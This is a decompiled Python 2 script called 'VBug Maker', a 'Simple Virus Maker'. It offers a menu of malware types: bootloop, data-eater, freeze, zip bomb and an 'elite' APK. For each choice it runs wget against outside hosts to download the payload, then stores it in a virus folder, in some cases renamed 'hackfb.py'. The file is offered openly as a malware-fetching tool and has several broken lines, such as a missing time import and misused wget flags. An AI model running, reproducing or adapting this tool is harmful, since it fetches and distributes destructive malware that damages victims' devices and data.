# uncompyle6 version 3.3.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.16 (default, Apr 14 2019, 17:57:24) 
# [GCC 4.2.1 Compatible Android (5058415 based on r339409) Clang 8.0.2 (https://a
# Embedded file name: <s>
import os, sys
R = '\x1b[1;31m'
N = '\x1b[0m'
Y = '\x1b[1;33m'
G = '\x1b[1;37m'
print '%s+---------------------------------------------------+%s' % (R, N)
print '%s||[#]%s--------------%s[ VBug Maker ]%s---------------%s[#]||%s' % (Y, R, Y, R, Y, N)
print '%s||%s |___________%s[ Simple Virus Maker ]%s____________|%s ||%s' % (Y, R, Y, R, Y, N)
print '%s||%s |____________%s[ Anvima * Session ]%s_____________|%s ||%s' % (Y, R, Y, R, Y, N)
print '%s+---------------------------------------------------+%s' % (R, N)
print
type_of_virus = raw_input(' %s[%s*%s] %s(%sB%s)%sootloop %s| %s(%sD%s)%sata-Eater %s| %s(%sF%s)%sreeze %s| %s(%sBO%s)%smb-Zip %s| %s(%sE%s)%slite %s:%s ' % (Y, R, Y, R, Y, R, G, Y, R, Y, R, G, Y, R, Y, R, G, Y, R, Y, R, G, Y, R, Y, R, G, R, Y))
if type_of_virus == 'B' or type_of_virus == 'b':
    print '\n %s[%s+%s]%s Download the virus%s...%s' % (Y, R, Y, G, R, N)
    os.system('wget https://raw.githubusercontent.com/storiku/virus/master/init.d2')
    os.system('mkdir -p virus/bootloop;mv init.d2 hackfb1.py;mv hackfb1.py virus/bootloop/')
    print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
    sys.exit()
else:
    if type_of_virus == 'D' or type_of_virus == 'd':
        print '\n %s[%s+%s]%s Download the virus%s...%s' % (Y, R, Y, G, R, N)
        os.system('wget https://raw.githubusercontent.com/storiku/virus/master/init.d')
        os.system('mkdir -p virus/data-eater;mv init.d hackfb.py;mv hackfb.py  virus/data-eater')
        print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
        sys.exit()
    else:
        if type_of_virus == 'F' or type_of_virus == 'f':
            print '\n %s[%s+%s]%s Download the virus%s...%s' % (Y, R, Y, G, R, N)
            os.system('wget -o freeze.apk http://override.waper.co/files/freeze.apk')
            os.system('mkdir virus/freeze;mv freeze.apk virus/freeze')
            print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
            sys.exit()
        else:
            if type_of_virus == 'BO' or type_of_virus == 'bo':
                print '\n %s[%s+%s]%s Download the virus%s...%s' % (Y, R, Y, G, R, N)
                os.system('wget -o 42.zip http://override.waper.co/files/42.zip')
                os.system('mkdir virus/bomb-zip;mv 42.zip virus/bomb-zip')
                print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
                sys.exit()
            else:
                if type_of_virus == 'E' or type_of_virus == 'e':
                    print '\n %s[%s+%s]%s Download the virus%s...%s' % (Y, R, Y, G, R, N)
                    os.system('wget -o http://override.waper.co/files/31337.apk')
                    os.system('mkdir virus/ELITE;mv elite.apk virus/ELITE')
                    print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
                    sys.exit()
                else:
                    print '%s[%s%s]%s ERROR%s:%s Wrong Input...%s' % (Y, R, Y, R, Y, G, N)
                    time.sleep(2)
                    print '%s[%s!%s]%s ERROR%s:%s Exit the Program...%s' % (Y, R, Y, R, Y, G, N)
                    sys.exit()
